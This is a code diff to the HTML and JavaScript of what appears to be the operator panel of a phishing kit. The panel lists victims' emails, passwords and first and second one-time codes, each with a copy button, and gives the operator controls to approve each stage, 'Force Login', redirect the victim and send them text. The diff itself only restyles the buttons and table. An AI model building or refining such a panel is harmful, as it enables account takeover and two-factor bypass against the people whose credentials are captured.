@@ -71,12 +71,12 @@ body{
   background:#fff;
   border-radius:16px;
   border:1px solid #e5e7eb;
-  overflow:auto;
+  overflow-x:auto;
 }
 table{
   width:100%;
   border-collapse:collapse;
-  min-width:1300px;
+  min-width:1400px;
 }
 th{
   text-align:left;
@@ -90,6 +90,7 @@ td{
   padding:14px 16px;
   border-bottom:1px solid #f0f0f0;
   color:#4b5563;
+  vertical-align:middle;
 }
 .badge{
   display:inline-block;
@@ -103,60 +104,55 @@ td{
 .badge-waiting{background:#e0e7ff;color:#4f46e5;}
 .badge-email{background:#fef3c7;color:#d97706;}
 
-.approve-email-btn{
-  background:#f59e0b;
-  color:white;
-  border:none;
-  padding:6px 14px;
+/* FIXED BUTTON STYLES - ALL IN ONE ROW */
+.actions-cell {
+  white-space: nowrap;
+}
+.action-btn {
+  display: inline-block;
+  padding:6px 12px;
   border-radius:8px;
   cursor:pointer;
   font-size:12px;
   font-weight:500;
-  margin-right:8px;
+  margin-right:6px;
+  border:none;
+  transition:all 0.2s;
+  white-space: nowrap;
+}
+.approve-email-btn{
+  background:#f59e0b;
+  color:white;
 }
 .approve-second-btn{
   background:#059669;
   color:white;
-  border:none;
-  padding:6px 14px;
-  border-radius:8px;
-  cursor:pointer;
-  font-size:12px;
-  font-weight:500;
-  margin-right:8px;
 }
 .force-login-btn{
   background:#8b5cf6;
   color:white;
-  border:none;
-  padding:6px 14px;
-  border-radius:8px;
-  cursor:pointer;
-  font-size:12px;
-  font-weight:500;
-  margin-right:8px;
 }
 .redirect-success-btn{
   background:#3b82f6;
   color:white;
-  border:none;
-  padding:6px 14px;
-  border-radius:8px;
-  cursor:pointer;
-  font-size:12px;
-  font-weight:500;
-  margin-right:8px;
 }
 .send-text-btn{
   background:#f97316;
   color:white;
-  border:none;
-  padding:6px 14px;
+}
+.waiting-badge{
+  background:#e0e7ff;
+  color:#4f46e5;
+  padding:6px 12px;
   border-radius:8px;
-  cursor:pointer;
   font-size:12px;
   font-weight:500;
-  margin-right:8px;
+  display:inline-block;
+  white-space: nowrap;
+}
+.action-btn:hover{
+  transform:translateY(-1px);
+  opacity:0.9;
 }
 .copy-btn{
   background:#6b7280;
@@ -314,9 +310,9 @@ td{
   </div>
 
   <div class="table-container">
-       <table>
+        <table>
       <thead>
-           <tr>
+            <tr>
           <th>Email</th>
           <th>Password</th>
           <th>First OTP</th>
@@ -328,9 +324,9 @@ td{
           </tr>
       </thead>
       <tbody id="usersTableBody">
-        <tr><td colspan="8" style="text-align:center; padding:40px;">Loading...<\/td><\/tr>
+        <tr><td colspan="8" style="text-align:center; padding:40px;">Loading...</td></tr>
       </tbody>
-      <\/table>
+        </table>
   </div>
 </div>
 
@@ -435,7 +431,6 @@ td{
     });
   }
 
-  // Send Text Modal Functions
   function showTextModal(email) {
     currentSelectedEmail = email;
     document.getElementById('adminTextInput').value = '';
@@ -533,7 +528,7 @@ td{
   function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
     if (!users.length) {
-      tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; padding:40px;">No users<\/td><\/tr>';
+      tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; padding:40px;">No users</td></tr>';
       return;
     }
     
@@ -543,17 +538,17 @@ td{
       
       if (!user.approved) {
         statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
-        actionButtons = `<button class="approve-email-btn" onclick="approveEmail('${user.email}')">📧 Approve Email</button>`;
+        actionButtons = `<button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')">📧 Approve Email</button>`;
       } else if (user.approved && !user.otp) {
         statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
-        actionButtons = '<span class="badge badge-pending">Waiting for user</span>';
+        actionButtons = '<span class="waiting-badge">Waiting for user</span>';
       } else if (user.approved && user.otp) {
         statusBadge = '<span class="badge badge-waiting">🔐 Ready for Second OTP Approval</span>';
         actionButtons = `
-          <button class="approve-second-btn" onclick="approveSecond('${user.email}')">🔐 Approve Current OTP</button>
-          <button class="force-login-btn" onclick="forceLogin('${user.email}')">🔒 Force Login</button>
-          <button class="redirect-success-btn" onclick="redirectToSuccess('${user.email}')">🎉 Redirect to Success</button>
-          <button class="send-text-btn" onclick="showTextModal('${user.email}')">📝 Send Text</button>
+          <button class="action-btn approve-second-btn" onclick="approveSecond('${user.email}')">🔐 Approve Current OTP</button>
+          <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')">🔒 Force Login</button>
+          <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')">🎉 Redirect to Success</button>
+          <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')">📝 Send Text</button>
         `;
       } else {
         statusBadge = '<span class="badge badge-pending">Pending</span>';
@@ -564,15 +559,15 @@ td{
       
       return `
         <tr>
-          <td><strong>${user.email}</strong> ${copyBtn(user.email, 'Email')}<\/td>
-          <td><code>${user.password || '-'}</code> ${copyBtn(user.password, 'Password')}<\/td>
-          <td>${user.otp ? `<span class="badge badge-waiting">${user.otp}</span> ${copyBtn(user.otp, 'First OTP')}` : '<span class="badge badge-pending">-</span>'}<\/td>
-          <td>${user.second_otp ? `<span class="badge badge-waiting">${user.second_otp}</span> ${copyBtn(user.second_otp, 'Second OTP')}` : '<span class="badge badge-pending">-</span>'}<\/td>
-          <td>${user.login_email ? `<code>${user.login_email}</code> ${copyBtn(user.login_email, 'Login Email')}` : '<span class="badge badge-pending">-</span>'}<\/td>
-          <td>${user.login_password ? `<code>${user.login_password}</code> ${copyBtn(user.login_password, 'Login Password')}` : '<span class="badge badge-pending">-</span>'}<\/td>
-          <td>${statusBadge}<\/td>
-          <td>${actionButtons}<\/td>
-        <\/tr>
+          <td><strong>${user.email}</strong> ${copyBtn(user.email, 'Email')}</td>
+          <td><code>${user.password || '-'}</code> ${copyBtn(user.password, 'Password')}</td>
+          <td>${user.otp ? `<span class="badge badge-waiting">${user.otp}</span> ${copyBtn(user.otp, 'First OTP')}` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${user.second_otp ? `<span class="badge badge-waiting">${user.second_otp}</span> ${copyBtn(user.second_otp, 'Second OTP')}` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${user.login_email ? `<code>${user.login_email}</code> ${copyBtn(user.login_email, 'Login Email')}` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${user.login_password ? `<code>${user.login_password}</code> ${copyBtn(user.login_password, 'Login Password')}` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${statusBadge}</td>
+          <td class="actions-cell">${actionButtons}</td>
+        </tr>
       `;
     }).join('');
   }
@@ -700,7 +695,6 @@ td{
   // Event listeners for modal buttons
   document.getElementById('sendTextBtnModal').addEventListener('click', sendTextToUser);
   document.getElementById('releaseTextBtnModal').addEventListener('click', releaseTextPopup);
-  // Close modal when clicking outside (optional)
   document.getElementById('textModal').addEventListener('click', (e) => {
     if (e.target === document.getElementById('textModal')) {
       hideTextModal();
